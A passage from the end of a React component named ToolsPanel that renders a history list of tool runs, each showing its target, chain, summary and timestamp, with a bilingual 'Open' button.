                className="flex flex-wrap items-center justify-between gap-3 rounded-lg border border-border bg-background px-3.5 py-2.5 font-mono text-xs"
              >
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-2">
                    <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                      {item.tool}
                    </span>
                    <span className="truncate font-bold text-foreground">{item.target}</span>
                    {item.chain && (
                      <span className="text-[10px] uppercase text-muted-foreground">[{item.chain}]</span>
                    )}
                  </div>
                  <p className="mt-1 truncate text-[11px] text-muted-foreground">
                    {item.summary} · {new Date(item.created_at * 1000).toLocaleString()}
                  </p>
                </div>
                <button
                  onClick={() => handleOpenHistoryItem(item)}
                  disabled={loadingHistoryId === item.id}
                  className="inline-flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-1.5 text-[11px] font-semibold text-foreground transition-colors hover:border-primary hover:text-primary disabled:opacity-50"
                >
                  <Eye size={12} />
                  <span>
                    {loadingHistoryId === item.id
                      ? isRu ? "Загрузка…" : "Loading…"
                      : isRu ? "Открыть" : "Open"}
                  </span>
                </button>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default ToolsPanel;
